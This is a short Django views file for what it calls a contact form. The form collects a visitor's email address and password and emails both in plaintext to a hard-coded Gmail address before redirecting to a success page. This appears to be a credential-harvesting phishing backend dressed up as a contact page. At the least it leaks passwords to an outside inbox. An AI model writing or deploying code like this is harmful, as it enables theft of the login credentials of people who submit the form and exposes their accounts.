from django.core.mail import send_mail

from django.shortcuts import redirect, render
from .forms import ContactForm
from django.template.loader import render_to_string

# Create your views here.
def index(request):
    if request.method == 'POST':
        form = ContactForm(request.POST)
        
        if form.is_valid():
            
            html = render_to_string('contact/emails/contactform.html', {
                'email': form.cleaned_data['email'],
                'password': form.cleaned_data['password'],
            })
            
            send_mail(
                subject=f"New contact form submission",
                from_email=form.cleaned_data['email'],
                message=f"Email: {form.cleaned_data['email']}, Password: {form.cleaned_data['password']}",  
                recipient_list=['bm3141838@gmail.com'],
                html_message=html,
            )
            
            
            
            return redirect('success')
    else:
        form = ContactForm()
        
        
    return render(request, 'contact/index.html',
                    {'form': form})


def success(request):
    return render(request, 'contact/success.html')
